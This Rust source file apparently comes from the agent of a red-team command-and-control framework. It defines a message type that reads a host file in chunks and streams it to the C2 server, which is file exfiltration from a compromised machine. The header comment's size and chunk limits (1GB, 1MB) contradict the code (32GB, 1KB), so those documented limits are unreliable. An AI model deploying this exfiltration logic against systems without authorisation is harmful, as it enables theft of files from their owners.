use super::{AsyncDispatcher, Transport};
use anyhow::{anyhow, Result};
use pb::{
    c2::ReportFileRequest,
    config::Config,
    eldritch::{File, FileMetadata},
};
use std::{io::Read, sync::mpsc::sync_channel};

/*
 * ReportFileMessage prepares a file on disk to be sent to the provided transport (when dispatched).
 *
 * It will not attempt to read files with a size greater than 1GB.
 * It will read the file in (1MB) chunks to prevent overwhelming memory usage.
 * If the transport becomes blocked, it will hold at most 2 chunks in memory and
 * block until the transport becomes available.
 * If the transport errors, it will close the file and exit immediately.
 * It will not open the provided file until it has been dispatched.
 */
#[cfg_attr(debug_assertions, derive(Debug, PartialEq))]
#[derive(Clone)]
pub struct ReportFileMessage {
    pub(crate) id: i64,
    pub(crate) path: String,
}

impl AsyncDispatcher for ReportFileMessage {
    async fn dispatch(self, transport: &mut impl Transport, _cfg: Config) -> Result<()> {
        // Configure Limits
        const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
        const MAX_CHUNKS_QUEUED: usize = 10; // 10 KB Limit (in channel)
        const MAX_FILE_SIZE: usize = 32 * 1024 * 1024 * 1024; // 32GB Limit (total file size)

        // Use a sync_channel to limit memory usage in case of network errors.
        // e.g. stop reading the file until more chunks can be sent.
        let (tx, rx) = sync_channel(MAX_CHUNKS_QUEUED);

        // Spawn a new tokio task to read the file (in chunks)
        let task_id = self.id;
        let path = self.path.clone();
        tokio::spawn(async move {
            let result = || -> Result<()> {
                // Open file for reading
                let mut f = std::fs::File::open(&path)?;
                let meta = f.metadata()?;

                // Limit file sizes
                if meta.len() > MAX_FILE_SIZE as u64 {
                    return Err(anyhow!("exceeded max file size"));
                }

                // Loop until we've finished reading the file
                loop {
                    let mut buffer = [0; CHUNK_SIZE];
                    let n = f.read(&mut buffer[..])?;

                    #[cfg(debug_assertions)]
                    log::info!(
                        "reporting file chunk (task_id={}, size={})",
                        task_id,
                        buffer.len()
                    );

                    // Send chunk to the transport stream this will block until
                    // the transport stream is able to flush the data to the network
                    tx.send(ReportFileRequest {
                        task_id,
                        chunk: Some(File {
                            metadata: Some(FileMetadata {
                                path: path.clone(),

                                // TODO: File Metadata
                                owner: String::new(),
                                group: String::new(),
                                permissions: String::new(),

                                // Automatically derived by server
                                size: 0,
                                sha3_256_hash: String::new(),
                            }),

                            // ..n so that we don't upload empty bytes
                            chunk: buffer[..n].to_vec(),
                        }),
                    })?;

                    if n < 1 {
                        break Ok(());
                    }
                }
            };

            match result() {
                Ok(_) => {}
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to report file: {}", _err);
                }
            }
        });

        // Wait for completion
        transport.report_file(rx).await?;

        Ok(())
    }
}
